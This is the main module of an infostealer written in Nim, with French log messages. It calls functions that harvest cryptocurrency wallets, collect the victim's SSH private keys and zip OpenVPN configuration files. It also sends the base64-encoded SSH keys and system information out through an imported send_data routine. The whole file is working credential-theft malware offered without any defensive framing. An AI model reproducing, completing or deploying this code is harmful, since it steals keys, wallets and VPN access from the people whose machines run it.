import os, strutils, times, json,base64
import winim/lean

import crypto_wallets/wallet_stealer
import ssh_stealer/ssh_stealer
import system_info/system_info
import vpn_stealer/vpn_stealer
import api/api

proc crypto_wallets_manager()=
  let data = extractAndZipWallets()
  if data != "":
    echo "[+] Wallets extraits: ", data.len, " bytes"
    echo "[+] Dossier: ", getTempDir() & "wallets_" & $getCurrentProcessId()
    echo "[+] ZIP: ", getTempDir() & "wallets_data.zip"
  else:
    echo "[-] Aucun wallet trouvé"

proc ssh_stealer_manager()=
    echo "[*] Extraction des clés SSH"
    echo repeat("=", 50)

    let keys = extractSSHKeys()

    if keys.len == 0:
      echo "[-] Aucune clé SSH trouvée"
      echo "[*] Dossier vérifié: ", getEnv("USERPROFILE") / ".ssh"
    else:
      echo "[+] ", keys.len, " fichier(s) trouvé(s):"

    for key in keys:
      let size = getFileSize(key)
      echo "    📁 ", extractFilename(key), " (", size, " bytes)"

      # Créer une archive
    let zipData = packSSHKeys()
    if zipData != "":
      echo "\n[+] Archive créée: ", zipData.len, " bytes"

    # Sauvegarder localement pour test
    # writeFile("ssh_keys_test.zip", zipData)
    # echo "[+] Sauvegardé: ssh_keys_test.zip"

    let json_data = %*{
      "files": [
        {
          "filename": "ssh_key",
          "data": encode(zipData)
        }
      ]
    }
    send_data(json_data)


proc system_info_manager()=
  let info = getSystemInfo()
  send_data(info)


proc vpn_stealer_manager()=
  let data = stealOVPNConfigs()
  if data != "":
    echo "[+] VPN configs: ", data.len, " bytes"
    writeFile("vpn_test.zip", data)

when isMainModule:
    
    crypto_wallets_manager()
    ssh_stealer_manager()
    system_info_manager()
    vpn_stealer_manager()